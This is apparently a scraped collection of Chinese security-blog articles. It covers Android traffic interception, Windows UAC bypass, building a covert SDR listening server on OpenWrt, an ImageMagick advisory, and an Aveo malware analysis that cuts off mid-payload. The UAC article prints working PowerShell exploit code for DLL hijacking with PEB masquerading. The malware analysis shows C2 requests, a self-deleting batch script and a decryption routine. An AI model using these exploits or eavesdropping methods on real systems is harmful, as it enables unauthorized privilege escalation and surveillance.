在这种情况下，它从所有可用接口捕获数据。 -p 指定 tcpdump 不将设备置于混杂模式（ 这是在执行嗅探攻击时经常使用的模式，并且不适合我们目前使用的模式） 。 在使用 -tcpdump 标志启动模拟器时，我们还可以指定使用 tcpdump 。 我们还需要使用 -avd 标志，指定要捕获流量的 AVD 名称。emulator -avd Android_Pentesting --tcpdump trafficcapture.pcap主 动 分 析主动分析的基本规则是，使每个请求和响应通过我们定义的中间设备。 在这种情况下，我们将设置一个代理，并使所有请求和响应通过该特定代理。 此外，我们可以选择操纵和修改请求和响应中的数据包，从而评估应用程序的安全性：为了为 HTTP 创建代理，请使用指定代理 IP 和端口以及 -http-proxy 标志启动模拟器。由于我们在同一个系统上运行模拟器，我们使用IP 127.0.0.1 和任何可用的端口。 在这种情况下，我们使用端口 8080。emulator -avd Android_Pentesting –http-proxy 127.0.0.1:8080在设备上，我们还可以访问 Settings | Wi-Fi ，然后长按我们连接的网络 Wi-Fi。 此外如果我们使用一个实际的设备，我们用于拦截的系统应该在同一个网络上。一旦我们长按 Wi-Fi 连接，我们将会得到一个类似于下面的截图所示的屏幕。 此外，如果你使用真实设备执行此练习，设备需要与代理位于同一个网络。一旦进入连接修改屏幕，请注意，代理配置会询问网络上的设备的 IP 地址和代理系统的端口。但是，这些设置仅存于从 4.0 开始的最新版本的 Android 中。 如果我们要在小于 4.0 的设备上实现代理，我们将必须安装第三方应用程序，例如 Play Store 上可用的ProxyDroid。一旦我们在设备/模拟器中设置了代理，请继续并启动 Burp 代理，来拦截流量。 下面 Options 选项卡中 Burp 代理的样子，以便有效拦截浏览器和应用程序的流量。我们还需要检查不可见的代理，以确保我们的代理也捕获 nonproxy 请求。 （ 读者可以在 Burp 的网站 http://blog.portswigger.net/2008/11/mobp-invisible-proxying.html 上详细了解不可见代理和非代理请求。）为了检查代理是否工作，打开浏览器并启动网站。 然后我们能够看到它是否在代理中被拦截。正如我们在上面的屏幕截图中看到的，我们打开了 URL http://attify.com ，请求现在显示在Burp Proxy 屏幕中。 因此，我们成功地拦截了来自设备和应用程序的所有基于 HTTP 的请求。4.3  HTTPS 代 理 拦 截当通过 HTTP 协议进行通信时，上述方法可以正常用于应用和流量器的流量拦截。 在 HTTPS 中，由于证书不匹配，我们将收到错误，因此我们无法拦截流量。然而，为了解决这个挑战，我们需要创建自己的证书或 Burp/PortSwigger 并将其安装在设备上。 为了创建我们自己的证书，我们需要在 Firefox（ 或任何其他浏览器或全局代理） 中设置代理：为了在 Firefox 中设置代理，请访问 Tools 中显示的 Options （ Mac上为 Firefox | Preferences ） ，然后访问 Advanced 选项卡。 在 Advanced 选项卡下，我们单击 Network 选项。在 Network 标签中，我们需要点击 Settings 来使用 Firefox 配置代理。完成后，在我们的系统浏览器上访问 HTTPS 网站，我们能跟拦截我们设备上的流量。这里我们将收到一个 The Network is Untrusted 消息。 点击 I understand the Risks ，并点击 Add Exception 。然后，单击 Get Certificate ，最后单击 View ，然后单击 Export 来保存证书。一旦证书保存在我们的系统上，我们现在可以使用 adb 将其推送到我们的设备。adb push portswiggerca.crt /mnt/sdcard/portswiggerca.crt现在，在我们的设备中，访问 Settings ，在 Personal 类别下，我们可以找到 Security 。 一旦我们进入 Security ，请注意，你可以选择从 SD 卡安装证书。 点击它使我们可以保存具有给定名称的证书，这适用于所有应用程序和浏览器，甚至是 HTTPS 站点。通过返回到我们的浏览器，并打开 HTTPS 网站（ 例如 https://gmail.com ） 来确认。 正如我们在下面的截图中可以看到的，我们在这种情况下也成功地拦截了通信：其它用于拦截 SSL 流量的方式还有用于 SSL 流量拦截的其他方法，以及在设备上安装证书的不同方法。其他方法之一是从 Android 设备的 /system/etc/security 位置拉取 cacerts.bks 文件。 一旦我们拉取了它，我们就可以使用密钥工具以及 Bouncy Castle（ 位于 Java 安装目录中） 来生成证书。 如果你在 Java 安装目录中找不到 Bouncy Castle，也可以从http://www.bouncycastle.org/latest_releases.html 下载并将其放置在已知路径。 此后，我们需要挂载 /system 分区作为读/写分区，以便将更新的 cacerts.bks 证书推送回设备。 然而，为了使这种更改长期有效，如果我们使用模拟器，我们将需要使用 mks.yaffs2 来创建一个新的 system.img 然后使用它。此外，还有其他工具可用于拦截 Android 设备的流量，例如 C harles Proxy 和MITMProxy（http://mitmproxy.org ） 。 我强烈建议你在 Burp 代理的知识的基础上尝试他们，因为它们在可用性方面是相同的，但是更强大。 在使用 Charles Proxy 时，我们可以直接从 www.charlesproxy.com/charles.crt 下载证书。在一些渗透测试中，应用程序可能正在和服务器通信并获得响应。 例如，假设用户试图访问应用的受限区域，该应用由用户从服务器请求。 然而，由于用户没有被授权查看该区域，服务器使用 403 Forbidden 进行响应。 现在，我们作为渗透测试人员，可以拦截流量，并将响应从 403 Forbidden 改为 200 OK 。 因此，用户现在甚至能够访问应用的未授权区域。修改类似响应的示例可以在第8章“ARM 利用”中找到，其中我们将讨论可通过流量拦截利用的一些其他漏洞。在应用程序中，保护流量的安全方法是让所有内容通过 HTTPS 传递，同时在应用程序中包含一个证书。 这样做使得当应用程序尝试与服务器通信时，它将验证服务器证书是否与应用程序中存在的证书相对应。 但是，如果有人正在进行渗透测试并拦截流量，则由渗透测试程序添加的设备使用的新证书（ 如 portswigger 证书） 与应用程序中存在的证书不匹配。 在这些情况下，我们必须对应用程序进行逆向工程，并分析应用程序如何验证证书。 我们甚至可能需要修改和重新编译应用程序。4.4  使 用 封 包 捕 获 来 提 取 敏 感 文 件现在我们来看看如何使用 Wireshark 从流量数据中提取敏感文件。 为了做到这一点，我们可以捕获数据包，并加载到 Wireshark 进行分析。从网络捕获中提取文件的基本概念是，它们含有指定文件类型的头部（multipart/form-data ） 。 以下是从网络流量捕获中提取任何类型文件的步骤：在 Wireshark 中，只需访问编辑并从包详细信息中搜索字符串 multipart 。一旦我们收到了向服务器发送 POST 请求的数据包（ 或者极少数情况下是 GET） ，右键单击该数据包，然后点击 Follow TCP Stream 。此后，根据文件起始值（ 如 PDF 的情况下为 %PDF ） ，从以下选项中选择 Raw ，然后使用扩展名 .pdf 保存文件。 因此，我们拥有了最终的 PDF，通过 Android 设备上传到网站，而且我们恰巧在我们的渗透中开启了网络捕获。我们还可以使用其他工具，如 Windows 上的 NetworkMiner（ 可从 http://www.netresec.com/?page=NetworkMiner 下载） ，它提供了一个精心构建的 GUI来与之交互，并显式指定保存的网络流量捕获文件。总 结在本章中，我们了解了在 Android 设备上执行流量分析的各种方法。 此外，我们会继续拦截来自应用程序和浏览器的 HTTP 和 HTTPS 流量数据。 我们还看到如何从网络捕获信息中提取敏感文件。在下一章中，我们将介绍 Android 取证，并使用手动方式以及在不同工具的帮助下，从Android 设备中提取一些敏感信息。","2017-02-25 14:11:44","移动安全","Android 渗透测试学习手册（四）对 Android 设备进行流量分析","http://nsoad.com/Article/MobileSecurity/20170225/1084.html"
"5ccbf9cc4f2f0a0a7a69bfc9","在这篇文章中，我们将讨论UAC（用户帐户控制）绕过攻击中涉及到的基本原则.","kong","0x00 前言在这篇文章中，我们将讨论UAC（用户帐户控制）绕过攻击中涉及到的基本原则。UAC(User Account Control，用户帐户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员‌密码。UAC在Windows Vista中被引入，使管理员用户能够使用标准用户权限而不是管理权限来对计算机进行操作。默认情况下，Windows上的初始用户帐户是管理员组的一部分，这只是一个简单的要求。正是因为这样，回到之前(Vista时代之前)，开发人员倾向于用户具有本地管理员权限，在开发他们的应用程序时需要提升权限。对此，官方的说法是UAC的引入是作为遏制这种行为并提供向后兼容性的方法。尽管如此，UAC的直接好处是保护或提醒管理员用户免受软件组件执行的恶意提权行为。我认为UAC实际上是一个非常熟练的安全机制(如果我们忘记普遍存在的dll侧面加载问题)，任谁想争辩说，这只需要看看一些先进的恶意软件工具包或者如Metasploit/Cobalt Strike等开源框架，其中包括了绕过UAC的机制。此外，我们不要忘记微软已经修补了一大堆绕过漏洞，例如使用WUSA提取CAB文件到一个特定的路径。无法实现可信的侧面加载修复，如果实现了将会大大提高终端用户的安全。无论如何，UAC总是引发激烈的辩论，所以我不会再谈论这个问题。让我们挖掘一下这个“兼容性”功能的漏洞0x01 资源	Bypass-UAC (@FuzzySec)	UACME (@hFireF0X)	Bypassing Windows User Account Control (UAC) and ways of mitigation (@ParvezGHH)	Fileless”UAC Bypass Using eventvwr.exe and Registry Hijacking (@enigma0x3)	Bypassing UAC on Windows 10 using Disk Cleanup (@enigma0x3)	Bypassing User Account Control (UAC) using TpmInit (@Cneelis)	Inside Windows 7 User Account Control (Microsoft Technet)	Inside Windows Vista User Account Control (Microsoft Technet)	User Account Control (MSDN)0x02 自动提升这里要理解的主要事情是，当进程正常启动而不是提升特权时，管理用户创建的进程令牌被剥夺了某些特权（例如：作为管理员运行..）。我们可以通过使用Get-TokenPrivs或Sysinternals过程资源管理器转储令牌权限来轻松地验证这一点。下面的屏幕截图显示了“cmd.exe”的两个实例，一个正常启动，一个作为管理员启动。从本质上说是属于管理员组的用户以与其他用户相同的权限管理其计算机。那么，高权限用户和低权限用户之间有什么区别？提权的操作仍然需要更改这个令牌，取决于UAC的设置，可以通知用户/要求密码。但至关重要的是，在两个UAC设置之间，其中之一是默认值，如果用户属于管理员组，Windows程序将自动升级。这些二进制文件可以通过转储其清单来标识，如下所示。找到这些二进制文件的一个简单方法是递归转储字符串并搜索“autoElevate&gt; true”。这里的逻辑是这些二进制文件是由微软签署的，考虑到他们的出处，并且用户是管理员，没有必要提示这个行为（换句话说，它是一个可用性功能）。这似乎是合理的，直到你打开进程监视器并找二进制文件成功地加载他们需要的资源（不仅是dll，还有注册表项）。不幸的是，这为恶意用户提供了充足的劫持机会。下面的例子显示了一个众所周知的情况，其中MMC用于提升RSOP，RSOP反过来试图高完整性的加载“wbemcomn.dll”（ =同样的Administrator）。可笑的是，看着过滤的输出，在这里至少有三个其他的UAC 0days（..sign）。如果有人想给Bypass-UAC提交pull，请自己敲出来！0x03 提权文件操作你可能会想“这些dll都在一个安全的目录”！像我们上面讨论的二进制文件，也有自动提升COM对象。这些COM对象之一对我们特别有用，IFileOperation这个COM对象包含许多有用的方法，如文件系统对象（文件和文件夹）的复制/移动/重命名/删除。传统上，攻击者编写的dll会实例化IFileOperation COM对象，并会执行将攻击者文件移动到受保护目录的方法（如上面例子的C:\Windows\System32\wbem\wbemcomn.dll）。获得COM对象自动将DLL注入到一个运行在一个可信目录的媒体完整性过程，通常是“explorer.exe”（ -&gt; fdwReason == DLL_PROCESS_ATTACH）。示例dll源码然而，事实证明有一种更灵活的方式来保持IFileOperation方法，将DLL注入到任何地方而不会触发警报。COM对象依赖进程状态API（PSAPI）来标识它们正在运行的进程。有趣的是，PSAPI解析进程PEB以获取此信息，但攻击者可以获取其自己进程的句柄并覆盖PEB以唬弄PSAPI，作为结果任何一个COM对象都可从伪造的PID实例化。我写了一个PowerShell POC（Masquerade-PEB）来说明这一点。在下面的示例中，PowerShell被伪装为explorer，Sysinternals进程资源管理器显然也被欺骗了。0x04 案例研究：winsxs，UAC 0day在下面的案例研究中，我们将看看Windows（WinSxS）dll加载问题。WinSxS在Windows ME中引入作为所谓的“dll hell”问题的解决方案。基本上它类似于全局程序集缓存，当一个二进制需要访问一个特定的库，它可以参考它清单中的库的版本，操作系统将继续从WinSxS文件夹(C:\Windows\WinSxS)加载相关的DLL。对于我们的案例研究，我们将看看自动升级的Microsoft远程协助二进制文件（C：\Windows\ System32\msra.exe）。下面我们可以看到二进制文件的内容。注意依赖部分，mrsa需要一些 “Microsoft.Windows.Common-Controls” 版本的库。让我们看看执行msra时进程监视器中会发生什么。msra寻找一个名为“msra.exe.Local”的目录，当它找不到该文件夹时它会访问“C：\Windows\WinSxS”，并加载它清单中指定的库。开发人员进行调试时可以合法使用dotlocal文件夹。你可以猜测当我们创建以下目录结构时会发生什么。# We can do this using elevated IFileOperation COM object methodsC:\Windows\System32\  |__&gt; msra.exe.Local  |___&gt; x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.10586.494_none_ea85e725b9ba5a4b如此多的* facepalm *，在这一点上我们需要做的是使用IFileOperation COM对象创建有payload DLL的文件夹并在命令行中执行MSRA，以此来绕过UAC。这有点过分简单，因为有效载荷dll可能会转发一些dll出口，但你得有想法。选择WinSxS作为案例研究的原因是，当你开始看自动提升二进制文件时，你会逐字地看到这个问题。推荐阅读KernelMode线程。0x05 案例研究：通过.NET劫持Ole32.dll=&gt; Bypass-UAC因为这种类型UAC绕过的有很多活动部件（使用提升的COM），我创建了一个PowerShell框架来处理所有的累活。Bypass-UAC有几个不同的组件：（1）Masquerade-PEB负责处理进程欺骗，(2) Invoke-IFileOperation暴露IFileOperation COM对象方法到PowerShell，（3）Emit-Yamabiko将payload dll存到磁盘。在过去的案例研究，我找了一个相对简单的UAC “0day”，我想找到一个不需要我更新Yamabiko的东西，这将工作在x32 / x64 Win7-Win10上。最后，我解决了.NET框架滥用负载的行为。有很多的方法来触发错误的加载行为，但是我们将使用MMC绕过UAC（* .msc）。Profiling MMC:让我们看看在启动“mmc gpedit.msc”时过程监视器中发生了什么（过滤：命令行有“mmc”，名称未找到，路径有“dll”）。下面的截图分别显示了Win 7和Win 10的结果。Win7Win10两个操作系统版本有一些可怕的条目！然而，忽略oddballs和那些不重叠的条目，我们留下“MFC42LOC.DLL”和“ole32.dll”。MFC42LOC需要一些进一步的研究，我已经看过它几次，但似乎没有发挥好。另一方面，Ole32被证明是一个合适的选择。Hijacking Ole32:我们需要解决的一个问题是，DLL显然是从一个不同的目录加载，一个简短的调查显示它默认的.NET版本文件夹查找ole32。我们可以使用以下PowerShell命令获取该版本。# Win 7PS C:\&gt; [System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersionv2.0.50727# Win 10PS C:\&gt; [System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersionv4.0.30319另一个不明显的问题是，在Bypass-UAC中的Yamabiko代理dll打开PowerShell，PowerShell本身会引发这个错误加载bug从而导致无限shell弹出…，为了避免这种行为，我们必须检测我们的payload dll被加载并删除它，所以它只执行一次！Bypass-UAC实现：添加方法绕过UAC是很容易的，如果你想了解更多，请查看在GitHub上的项目！为了让我们的bypass更加便利，我添加了以下方法，如果有任何问题，请随时留言！'UacMethodNetOle32'{# Hybrid MMC method: mmc some.msc -&gt; Microsoft.NET\Framework[64]\..\ole32.dll# Works on x64/x32 Win7-Win10 (unpatched)if ($OSMajorMinor -lt 6.1) {echo ""[!] Your OS does not support this method!`n""Return}# Impersonate explorer.exeecho ""`n[!] Impersonating explorer.exe!""Masquerade-PEB -BinPath ""C:\Windows\explorer.exe""if ($DllPath) {echo ""[&gt;] Using custom proxy dll..""echo ""[+] Dll path: $DllPath""} else {# Write Yamabiko.dll to diskecho ""[&gt;] Dropping proxy dll..""Emit-Yamabiko}# Get default .NET version[String]$Net_Version = [System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion# Get count of PowerShell processes$PS_InitCount = @(Get-Process -Name powershell).Count# Expose IFileOperation COM objectInvoke-IFileOperation# Exploit logicecho ""[&gt;] Performing elevated IFileOperation::MoveItem operation..""# x32/x64 .NET folderif ($x64) {$IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\Microsoft.NET\Framework64\' + $Net_Version + '\'), ""ole32.dll"")} else {$IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\Microsoft.NET\Framework\' + $Net_Version + '\'), ""ole32.dll"")}$IFileOperation.PerformOperations()echo ""`n[?] Executing mmc..""IEX $($env:SystemRoot + '\System32\mmc.exe gpedit.msc')# Move Yamabiko back to %tmp% after it loads to avoid infinite shells!while ($true) {$PS_Count = @(Get-Process -Name powershell).Countif ($PS_Count -gt $PS_InitCount) {try {# x32/x64 .NET folerif ($x64) {$IFileOperation.MoveItem($($env:SystemRoot + '\Microsoft.NET\Framework64\' + $Net_Version + '\ole32.dll'), $($env:Temp + '\'), 'ole32.dll')} else {$IFileOperation.MoveItem($($env:SystemRoot + '\Microsoft.NET\Framework\' + $Net_Version + '\ole32.dll'), $($env:Temp + '\'), 'ole32.dll')}$IFileOperation.PerformOperations()break} catch {# Sometimes IFileOperation throws an exception# when executed twice in a row, just rerun..}}}# Clean-upecho ""[!] UAC artifact: $($env:Temp + '\ole32.dll')`n""}案例结束，下面的屏幕截图演示了在Windows 8（x64）和Windows 10（x32）上的绕过。Win8 x64Win10 x32从另一方面来说，这是一个相当不错的持久化机制。删除ole32在.NET框架文件夹中封装的DLL，计划使用.NET在启动/空闲时运行任何事情。0x06 总结如果你做到这一步，我想你就能明白为什么微软不承认UAC绕过。老实说我认为，让UAC步入正轨的最好的方法是积极的补丁机制。","2016-11-29 12:20:18","系统安全","UAC 攻击剖析","http://nsoad.com/Article/system/20161129/859.html"
"5ccbf9cc4f2f0a0a7a69bfca","近期因为有个从异地捕获无线信号的需求，便尝试着用OpenWrt+公网IP搭建了一台SDR服务器。如果有小伙伴嫌SDR硬件天线看起来太乱、或者电脑没有足够的USB接口也可在局域网搭建SDR服务器通过TCP/IP调用SDR硬件","kong","0×00 前言近期因为有个从异地捕获无线信号的需求，便尝试着用OpenWrt+公网IP搭建了一台SDR服务器。如果有小伙伴嫌SDR硬件天线看起来太乱、或者电脑没有足够的USB接口也可在局域网搭建SDR服务器通过TCP/IP调用SDR硬件。HiWiFi router0×01 获取root刚买的极路由关闭了root功能，需要开启路由的开发者模式后才能通过SSH连入shell交互界面。申请开发者模式流程：进入路由器后台-云平台-路由器信息-高级设置-申请-绑定手机-输入验证码-绑定微信-微信账号绑定极路由账号。下图是开启开发者模式前后的Nmap扫描结果：开启开发者模式后可通过1022端口进入路由器shell界面：ssh root@192.168.199.1 -p 10220×02 极路由刷不死uboot开启开发者模式后可对设备进行刷机，为了防止设备变砖可在设备刷入具有不死uboot之称的Breed Bootloader。在 http://breed.hackpascal.net/ 页面找到对应型号的uboot （极路由1s：HC5661、极路由2s：HC5761、极路由3：HC5861）下载、刷入ubootcd /tmpwget http://breed.hackpascal.net/breed-mt7620-hiwifi-hc5861.binmtd -r write  breed-mt7620-hiwifi-hc5861.bin显示rebooting后等待路由重启完成。重启完毕后三灯亮起，这时需断开电源，按住路由器的RST重置键然后再通电，当看到电源灯闪烁时可以松开RST键。电脑通过网线接入后自动获取ip，用浏览器192.168.1.1即可登陆Breed控制台。安全起见，备份所有内容：0×03 极路由刷OpenWrt由于SDR服务器需要一个USB接口来插电视棒，所以需要在购买极路由的时候选一款带USB接口的机器。其它带USB接口的OpenWrt路由器也适用下文的内容.查看CPU信息：cat /proc/cpuinfo下载OpenWrt固件： 选择自己路由器对应的版本cd /tmpwget http://rssn.cn/roms/openwrt-15.05-ramips-mt7620-hc5861-squashfs-sysupgrade.binsysupgrade -F -n openwrt-15.05-ramips-mt7620-hc5861-squashfs-sysupgrade.bin0x04OpenWrt安装RTL驱动OpenWrt刷入重启后，进入管理界面：http://192.168.1.1user:rootpass：root设置SSH密码ssh root@192.168.1.1Openwrt可以使用opkg命令对软件包进行管理opkg updateopkg list |grep rtlopkg install rtl-sdr安装完成后便可将电视棒插入路由器的USB接口:启动OpenW上的rtl-sdrOpenWrt终端执行：rtl_tcp -a 192.168.1.1 -n 8 -b 8之后OpenWrt上将开启1234端口：0×05使用SDR服务客户机上执行：osmocom_fft -W -s 2000000 -f 144000000 -a 'rtl_tcp=192.168.1.1:1234'osmocom_fft -F -s 1.5e6 -f 101e6 -a 'rtl_tcp=192.168.1.1:1234'grqx0×06利用场景1.可在机场塔台、港口等地方使用SDR服务器监测ADB-S、AIS（船舶自动识别系统Automatic Identification System）2.利用SDR+WIFI捕获 语音、图像数据：更多细节可参考DefCon Paper:How Hackers Could Wirelessly Bug Your OfficeVideo:YouTuBeMayBe还能通过SDR服务器利用MouseJack漏洞对办公区域的键盘鼠标输入进行监听：http://www.freebuf.com/articles/terminal/97011.htmlhttp://www.freebuf.com/articles/wireless/115440.html0×07 Referhttps://github.com/rssnsj/openwrt-hc5x61http://www.binss.me/blog/install-openwrt-on-hiwifi-router/http://www.right.com.cn/forum/thread-161906-1-1.htmlhttp://www.levey.cn/352.htmhttp://www.right.com.cn/forum/thread-161906-1-1.htmlhttp://yo2ldk.blogspot.com/2016/03/wireless-sdr-receiver.htmlhttp://adventurist.me/posts/0050http://sdr.osmocom.org/trac/wiki/rtl-sdr","2016-12-07 13:38:44","无线安全","如何用极路由+OpenWrt+RTL电视棒搭建一台SDR服务器，并隐秘地捕获和传输数据","http://nsoad.com/Article/wifi/20161207/892.html"
"5ccbf9d54f2f0a0a7a69bfcb","近日，Cisco Talos发布了一条关于ImageMagick远程代码执行漏洞的通告：Vulnerability Spotlight: ImageMagick Convert Tiff Out of Bounds Write 攻击者成功利用漏洞后，可导致远程代码执行。","kong","漏洞概述近日，Cisco Talos发布了一条关于ImageMagick远程代码执行漏洞的通告：Vulnerability Spotlight: ImageMagick Convert Tiff Out of Bounds Write 攻击者成功利用漏洞后，可导致远程代码执行。关于ImageMagickImageMagick软件是用C语言编写的，可用来显示、转换以及编辑图形，支持超过200种图像文件格式，并且可以跨平台运行。ImageMagick软件被许多编程语言所支持，包括Perl，C++，PHP，Python和Ruby等，并被部署在数以百万计的网站，博客，社交媒体平台和流行的内容管理系统(CMS)。受影响的版本： ImageMagick version &lt; 7.0.3-9 不受影响的版本 ：ImageMagick version = 7.0.3-9漏洞分析在网上找了一下漏洞的细节分析，在一个日文博客网站中找到了一些细节，感兴趣的童鞋可自行阅读分析：http://d.hatena.ne.jp/yoya/20161205/im修复方案升级到目前的最新版本（7.0.3-9）ImageMagic历史漏洞相关来源http://blog.talosintel.com/2016/12/ImageMagick-Tiff-out-of-Bounds.html    http://d.hatena.ne.jp/yoya/20161205/im  https://security-tracker.debian.org/tracker/CVE-2016-8707","2016-12-07","漏洞发布","【漏洞预警】ImageMagick压缩TIFF图片远程代码执行漏洞（CVE-2016-8707）","http://nsoad.com/Article/exploit/20161207/vulzone-43.html"
"5ccbf9d54f2f0a0a7a69bfcc","Palo Alto Networks 发现了一个名为 Aveo 的恶意软件家族，它针对日语用户开发。","kong","Palo Alto Networks 发现了一个名为 Aveo 的恶意软件家族，它针对日语用户开发。Aveo 的名字来自于其二进制文件中的嵌入式调试字符串。Aveo 恶意软件家族与 ForrmerFirstRAT 恶意软件家族有密切的联系，二者都针对日语用户。Aveo    会伪装成 Microsoft Excel 文档，并在执行时抛出诱饵文件。诱饵文档与埼玉工業大学 Ido 实验室的研究有关。执行后，Aveo 可以接收多种命令，这将允许攻击者完全控制感染主机。部署Aevo 的样本会伪装成 Microsoft Excel 文档，如下图所示。值得注意的是，malware.exe 只是一个占位符，原文件名未知。该可执行文件其实是一个 WinRAR 的自解压可执行文件，它会在执行时抛出诱饵文档和 Aveo 木马来运行。下图就是抛出的诱饵文档，在运行之后打开：这个诱饵文档是关于 Ido 实验室 2016 年研究立项的信息。该文件列出了 16 名参加 CAVE 的名单，包括名字、单位以及邮件地址。这个文档用日语书写，文件名也是日文 CAVE研究会参加者.xls，这些都表明该恶意软件是针对日语用户的。此外，Aveo 和 FormerFirstRAT 家族的相似性将会在稍后讨论，这个讨论将进一步支持该恶意软件是针对日语用户的。基础设施Aveo 木马配置了以下域名来进行 HTTP 通信：snoozetime[.]infojack.ondo@mail.com 最早在 2015 年 5 月就注册了，自那时起，该邮箱已经和以下三个 IP 地址关联上了：104.202.173[.]82107.180.36[.]17950.63.202[.]38所有这些 IP 地址都位于美国境内。从 snoozetime[.]info 的 WHOIS 信息来看，注册邮箱为jack.ondo@mail[.]com，注册名为aygt5ruhrj aygt5ruhrj gerhjrt。根据这两条线索进行拓展：bluepaint[.]infocoinpack[.]info7b7p[.]infodonkeyhaws[.]infoeuropcubit[.]comjhmiyh.ny@gmail[.]com844148030@qq[.]com恶意软件分析在自解压可执行文件运行后，一系列的文件释出到文件系统中，其执行流如下：当 mshelp32.exe 可执行程序运行时，首先读取setting32.ini 文件，其中包含着诱饵文档的名字。这一信息被用来构建一个批处理脚本，如下：@echo offcopy ""CAVE研究会参加者.xls"" ""C:\Documents and Settings\Administrator\Desktop\8101c298a33d91a985a5150d0254cf426601e4632250f5a03ddac39375e7fb4d.xls"" /Ydel ""CAVE研究会参加者.xls"" /F /Qdel mshelp32.exe /F /Qdel setting32.ini /F /Qdel ""C:\Documents and Settings\Administrator\Desktop\8101c298a33d91a985a5150d0254cf426601e4632250f5a03ddac39375e7fb4d.exe""  /F /Qdel %0 /F /Q该批处理脚本在一个新的进程中执行，在 Aveo 运行、诱饵文档释放后执行清理工作。Aveo 恶意软件家族Aveo 恶意软件会在开始运行一个安装程序，该程序会复制自身到以下位置：%APPDATA%\MMC\MMC.exe如果因为某种原因，%APPDATA%\MMC 目录不能被创建，Aveo 将会使用 %TEMP% 来代替 %APPDATA%。恶意软件自身复制完成后，将会在新的进程中以原文件名为参数执行 MMC.exe。当执行时，如果提供了这单个参数，恶意软件将会删除掉制定路径内的文件。安装完成后，Aveo 将会提取以下受害人信息通过 HTTP 传到远程控制服务器上：Unique victim hashIP AddressMicrosoft Windows versionUsernameANSI code page identifier这个信息被送到 snoozetime[.]info上，像下面的 HTTP 请求样例：GET /index.php?id=35467&amp;1=ySxlp03YGm0-&amp;2=yiFi6hjbFHf9UtL44RPQ&amp;4=zTZh6h7bHGjiUMzn&amp;5=sXcjrAmqXiyiGJWzuUQ-&amp;6=yipl9g-- HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)Host: snoozetime[.]infoCache-Control: no-cache恶意软件使用了 RC4 来对数据进行加密，使用 hello作为密钥。如下图所示，Aveo 和 FormerFirstRAT 的加密部分几乎是相同的，只s是算法和密钥变了。可以通过以下代码来解密 HTTP 中传输的数据：import base64from binascii import *from struct import *from wincrypto import CryptCreateHash, CryptHashData, CryptDeriveKey, CryptEncrypt, CryptDecryptCALG_RC4 = 0x6801CALG_MD5 = 0x8003def decrypt(data):  md5_hasher = CryptCreateHash(CALG_MD5)  CryptHashData(md5_hasher, 'hello')  generated_key = CryptDeriveKey(md5_hasher, CALG_RC4)  decrypted_data = CryptDecrypt(generated_key, data)  return decrypted_datafor a in 'index.php?id=35467&amp;1=niBo9x/bFG4-&amp;2=yi9i6hjbAmD5TNPu5A--&amp;4=zTZh6h7bHGjiUMzn&amp;5=sXcjrAmqXiyiGJWzuUQ-&amp;6=yipl9g--'.split(""&amp;"")[1:]:  k,v = a.split(""="")  decrypted = decrypt(base64.b64decode(v.replace(""-"",""="")))  print ""[+] Parameter {} Decrypted: {}"".format(k, decrypted)运行以上代码会产生以下结果：[+] Parameter 1 Decrypted: e8836687[+] Parameter 2 Decrypted: 172.16.95.184[+] Parameter 4 Decrypted: 6.1.7601.2.1[+] Parameter 5 Decrypted: Josh Grunzweig[+] Parameter 6 Decrypted: 1252在得到受害者信息后，恶意软件会按照预期返回 OK。之后 Aveo 将会产生一个新的线程来负责处理 C&amp;C 服务器的命令，以及请求产生的交互式 Shell。Aveo 对注册表进行以下设置，以指向恶意软件的路径，从而保证重新启动后恶意软件仍然可以持久工作：HKCU\software\microsoft\windows\currentversion\run\msnetbridge然后命令处理程序进入轮询等待，Aveo 会从 C&amp;C 服务器接收命令。虽然 Aveo 在等待响应，它也会执行随机延迟，延迟时间在    0 到 3276 毫秒之间。如果 C&amp;C 服务器返回 toyota，会将间隔设置为 60 秒。Aveo 可以接收以下命令：1.执行交互 Shell 命令2.获取文件属性3.写入文件4.读取文件5.驱动器列表6.对路径执行 DIR 命令以下请求显示了 C&amp;C 服务器发送 ipconfig 命令到 Aveo 的过程：C&amp;C 请求GET /index.php?id=35468&amp;1=niBo9x/bFG4- HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)Host: snoozetime[.]infoCache-Control: no-cacheHTTP/1.0 200 OKContent-Type: text/html; charset=utf-8Content-Length: 11Server: Werkzeug/0.11.10 Python/2.7.5Date: Wed, 10 Aug 2016 16:00:11 GMT\xca89\xb4J\x82B?\xa5\x05\xe8[Decrypted] 1 ipconfigAveo 响应POST /index.php?id=35469&amp;1=niBo9x/bFG4- HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)Host: snoozetime[.]infoContent-Length: 1006Cache-Control: no-cache\xca\x38\x39\xb4\x4a\x82\x42\x3f\xa5\x05\xe8\xdb\xda\x74\x8b\x79\x39\x46\xf2\x42\x1f\xcd\x39\xf3\x65\x1d\xda\x49\x40\x6c\x5e\x6e\xab\x79\xc2\x44\xc3\xb0\x12\xfd\xe2\x84\x67\x0d\xa5\xd3\x50\x2d\x1c\x31\x4a\x9e\xcb\x3d\x08\xe6\x1b\x04\x85\xbf\x11\x0e\x96\x63\xcf\x71\xfe\xe4\x97\x2a\xdc\x12\x23\x4d\xcb\x0f\x93\x30\xbc\xa0\xc8\x4e\x4e\xd8\xdb\x33\xa2\xbe\xff\x5e\x89\x22\xb9\x16\xd1\xf0\x60\x71\x64\x7a\x10\xb8\x78\x76\xe5\x08\x90\x46\x30\xa3\xe2\x4e\xdc\x98\x11\x27\x62\x38\x00\xb4\x54\x6d\xd7\x5b\x19\x5f\x19\xb8\xd1\xf5\xc1\x9b\x97\xda\x84\x2c\xdd\x2d\x97\x0a\x69\x51\xd9\x31\x77\x4a\xe2\x7f\x5e\xc5\xaf\x02\x3c\x69\x9c\x5f\x94\x3e\x0c\x25\xce\x63\xa9\x43\xff\x34\x25\x42\x95\xa9\x1f\xaa\xdf\x2b\xa7\xb1\xc0\x3[